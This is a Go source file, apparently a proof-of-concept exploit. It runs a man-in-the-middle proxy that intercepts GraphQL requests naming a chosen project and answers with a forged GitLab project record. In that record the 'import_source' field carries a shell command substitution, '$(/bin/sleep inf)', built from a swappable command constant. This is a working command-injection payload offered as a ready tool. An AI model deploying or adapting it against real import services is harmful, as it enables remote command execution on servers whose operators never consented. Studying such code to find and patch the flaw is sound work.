package main

import (
	"io"
	"os"
	"fmt"
	"bytes"
	"net/url"
	"net/http"
	"net/http/httputil"
)

const importProjectName = "projectwtf"
const runCmd = "/bin/sleep inf"
const proxyTo = "http://localhost:8000/"
var proxyToUrl *url.URL

func init() {
	var err error
	proxyToUrl, err = url.Parse(proxyTo)
	if err != nil {
		panic(err)
	}
}

func perror(a ...any) {
	fmt.Fprintln(os.Stderr, a...)
}

func proxy(w http.ResponseWriter, r *http.Request) {
	perror("IN:", r.Method, r.RequestURI)
	
	// mitm code
	if r.Method == "POST" && r.RequestURI == "/api/graphql" {
		perror("NOTICE: check")
		bb, err := io.ReadAll(r.Body)
		r.Body.Close()
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		if bytes.Contains(bb, []byte(importProjectName)) {
			perror("NOTICE: replace")
			// send our fake response
			hd := w.Header()
			hd.Set("Content-Type", "application/json; charset=utf-8")
			hd.Set("Permissions-Policy", "interest-cohort=()")
			hd.Set("Referrer-Policy", "strict-origin-when-cross-origin")
			w.WriteHeader(200)
			w.Write(
				[]byte(
					`{"data":{"project":{"description":"Example plain HTML site using GitLab Pages: https://pages.gitlab.io/plain-html","visibility":"public","archived":false,"created_at":"2022-07-29T08:17:46Z","shared_runners_enabled":true,"container_registry_enabled":false,"only_allow_merge_if_pipeline_succeeds":false,"only_allow_merge_if_all_discussions_are_resolved":false,"request_access_enabled":false,"printing_merge_request_link_enabled":true,"remove_source_branch_after_merge":true,"autoclose_referenced_issues":true,"suggestion_commit_message":null,"wiki_enabled":false,"template_name":"plainhtml","import_source":"$(`+runCmd+`)"}}}`,
				),
			)
			return // do not pass to proxy
		} else {
			//fmt.Println(string(bb))
			// restore the body that we have read
			r.Body = io.NopCloser(bytes.NewBuffer(bb))
		}
	}

	rp := httputil.NewSingleHostReverseProxy(proxyToUrl)
	rp.ServeHTTP(w, r)
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", proxy)
	s := &http.Server {
		Addr: "0.0.0.0:8100",
		Handler: mux,
	}
	s.ListenAndServe()
}
